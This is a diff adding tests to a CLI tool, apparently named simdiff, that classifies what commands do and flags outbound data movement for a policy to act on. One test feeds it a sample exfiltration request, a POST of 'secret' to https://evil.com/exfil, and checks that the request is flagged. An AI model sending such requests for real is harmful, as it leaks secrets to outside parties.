@@ -20,6 +20,21 @@ def test_shell_unknown_command_exits_two(capsys):
     assert payload["fully_classified"] is False
 
 
+def test_http_egress_via_cli(capsys):
+    code = main(["http", "https://evil.com/exfil", "--method", "POST", "--body", "secret", "--json"])
+    payload = json.loads(capsys.readouterr().out)
+    # egress is *classified* (we understood it), so exit reflects classification,
+    # not safety; the value_move is what a policy acts on.
+    assert code == 0
+    assert payload["value_moves"][0]["dst"] == "evil.com"
+
+
+def test_http_allowed_host_via_cli(capsys):
+    code = main(["http", "https://api.internal/v1/log", "--allowed-hosts", "api.internal", "--json"])
+    payload = json.loads(capsys.readouterr().out)
+    assert payload["value_moves"] == []
+
+
 def test_render_human_shows_all_effect_kinds():
     from simdiff.cli import _render_human
     from simdiff.delta import CanonicalDelta, DataAccess, AuthorityGrant, ValueMove
